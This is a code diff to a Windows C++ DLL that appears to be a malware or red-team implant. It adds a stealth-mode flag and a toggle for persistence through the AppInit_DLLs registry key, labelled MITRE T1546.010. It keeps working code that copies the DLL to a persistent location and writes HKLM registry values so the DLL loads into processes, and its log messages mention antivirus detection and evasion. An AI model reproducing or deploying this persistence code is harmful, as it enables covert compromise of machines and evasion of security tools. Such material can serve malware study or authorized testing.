@@ -18,6 +18,10 @@
 // Stealth mode - set to true to disable MessageBox (silent operation)
 #define STEALTH_MODE false
 
+// AppInit_DLLs persistence - DISABLED by default (too aggressive, detected by AV)
+// Set to true only for testing in isolated environments with AV disabled
+#define ENABLE_APPINIT_PERSISTENCE false
+
 // Forward declarations for persistence
 void LogDLLActivity(const std::string& message);
 bool EstablishDLLPersistence(HMODULE hModule);
@@ -209,31 +213,42 @@ bool EstablishDLLPersistence(HMODULE hModule)
             {
                 LogDLLActivity("[PERSISTENCE] DLL copied to: " + persistentPath);
                 
-                // Add to AppInit_DLLs registry (requires admin - optional)
-                HKEY hKey;
-                if (RegOpenKeyExA(
-                    HKEY_LOCAL_MACHINE,
-                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
-                    0,
-                    KEY_SET_VALUE,
-                    &hKey) == ERROR_SUCCESS)
+                // AppInit_DLLs persistence - ONLY if enabled (very aggressive, detected by AV)
+                if (ENABLE_APPINIT_PERSISTENCE)
                 {
-                    // Enable AppInit_DLLs
-                    DWORD loadAppInit = 1;
-                    RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, 
-                        (BYTE*)&loadAppInit, sizeof(loadAppInit));
-                    
-                    // Set DLL path
-                    RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
-                        (BYTE*)persistentPath.c_str(), (DWORD)persistentPath.length() + 1);
-                    
-                    RegCloseKey(hKey);
-                    LogDLLActivity("[PERSISTENCE] AppInit_DLLs registry updated (T1546.010)");
-                    return true;
+                    // Add to AppInit_DLLs registry (requires admin)
+                    HKEY hKey;
+                    if (RegOpenKeyExA(
+                        HKEY_LOCAL_MACHINE,
+                        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
+                        0,
+                        KEY_SET_VALUE,
+                        &hKey) == ERROR_SUCCESS)
+                    {
+                        // Enable AppInit_DLLs
+                        DWORD loadAppInit = 1;
+                        RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, 
+                            (BYTE*)&loadAppInit, sizeof(loadAppInit));
+                        
+                        // Set DLL path
+                        RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
+                            (BYTE*)persistentPath.c_str(), (DWORD)persistentPath.length() + 1);
+                        
+                        RegCloseKey(hKey);
+                        LogDLLActivity("[PERSISTENCE] AppInit_DLLs registry updated (T1546.010)");
+                        LogDLLActivity("[WARNING] This method is aggressive and detected by most AV!");
+                        return true;
+                    }
+                    else
+                    {
+                        LogDLLActivity("[PERSISTENCE] AppInit_DLLs requires admin privileges - skipped");
+                    }
                 }
                 else
                 {
-                    LogDLLActivity("[PERSISTENCE] AppInit_DLLs requires admin privileges - skipped");
+                    LogDLLActivity("[PERSISTENCE] AppInit_DLLs disabled (too aggressive for AV evasion)");
+                    LogDLLActivity("[PERSISTENCE] DLL copied for manual loading/persistence");
+                    return true;
                 }
             }
         }
